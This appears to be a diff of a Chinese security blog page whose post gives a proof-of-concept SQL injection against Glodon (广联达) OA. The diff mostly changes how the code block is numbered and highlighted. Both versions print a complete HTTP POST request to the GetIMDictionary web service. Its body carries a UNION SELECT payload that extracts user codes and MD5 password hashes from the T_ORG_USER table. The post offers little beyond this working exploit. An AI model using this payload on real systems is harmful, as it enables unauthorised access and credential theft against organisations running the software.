@@ -16,15 +16,15 @@
   <meta name="author" content="3xsh0re">
   <meta name="keywords" content="">
   
-    <meta name="description" content="广联达OA SQL注入漏洞POC123POST &#x2F;Webservice&#x2F;IM&#x2F;Config&#x2F;ConfigService.asmx&#x2F;GetIMDictionary HTTP&#x2F;1.1Host: xxx.comUpgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKi">
+    <meta name="description" content="广联达OA SQL注入漏洞POC123456789101112POST &#x2F;Webservice&#x2F;IM&#x2F;Config&#x2F;ConfigService.asmx&#x2F;GetIMDictionary HTTP&#x2F;1.1Host: xxx.comUpgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7">
 <meta property="og:type" content="article">
 <meta property="og:title" content="广联达OA_SQL注入漏洞">
 <meta property="og:url" content="https://remixxyh.github.io/2023/08/11/%E5%B9%BF%E8%81%94%E8%BE%BEOA-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/index.html">
 <meta property="og:site_name" content="3xsh0re">
-<meta property="og:description" content="广联达OA SQL注入漏洞POC123POST &#x2F;Webservice&#x2F;IM&#x2F;Config&#x2F;ConfigService.asmx&#x2F;GetIMDictionary HTTP&#x2F;1.1Host: xxx.comUpgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKi">
+<meta property="og:description" content="广联达OA SQL注入漏洞POC123456789101112POST &#x2F;Webservice&#x2F;IM&#x2F;Config&#x2F;ConfigService.asmx&#x2F;GetIMDictionary HTTP&#x2F;1.1Host: xxx.comUpgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2023-08-11T04:06:46.000Z">
-<meta property="article:modified_time" content="2023-08-11T04:07:25.963Z">
+<meta property="article:modified_time" content="2023-08-11T04:14:52.457Z">
 <meta property="article:author" content="3xsh0re">
 <meta property="article:tag" content="POC">
 <meta property="article:tag" content="广联达OA">
@@ -250,7 +250,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          700 字
+          712 字
         
       </span>
     
@@ -311,7 +311,7 @@
             
               <div class="markdown-body">
                 
-                <h3 id="广联达OA-SQL注入漏洞"><a href="#广联达OA-SQL注入漏洞" class="headerlink" title="广联达OA SQL注入漏洞"></a>广联达OA SQL注入漏洞</h3><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http">POST /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary HTTP/1.1Host: xxx.comUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36Accept: text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: http://xxx.com:8888/Services/Identification/Server/Incompatible.aspxAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 88<br>dasdas=&amp;key=1&#x27; UNION ALL SELECT top 1812 concat(F_CODE,&#x27;:&#x27;,F_PWD_MD5) from T_ORG_USER --<br> <br></code></pre></td></tr></table></figure>
+                <h3 id="广联达OA-SQL注入漏洞"><a href="#广联达OA-SQL注入漏洞" class="headerlink" title="广联达OA SQL注入漏洞"></a>广联达OA SQL注入漏洞</h3><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/Webservice/IM/Config/ConfigService.asmx/GetIMDictionary</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>xxx.com<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://xxx.com:8888/Services/Identification/Server/Incompatible.aspx<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: Connection: close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>88<br><br><span class="language-ada">dasdas=&amp;key=<span class="hljs-number">1</span>&#x27; UNION <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">SELECT</span> top <span class="hljs-number">1812</span> concat(F_CODE,<span class="hljs-string">&#x27;:&#x27;</span>,F_PWD_MD5) from T_ORG_USER <span class="hljs-comment">--</span></span><br><span class="language-ada"> </span><br></code></pre></td></tr></table></figure>
 
                 
               </div>
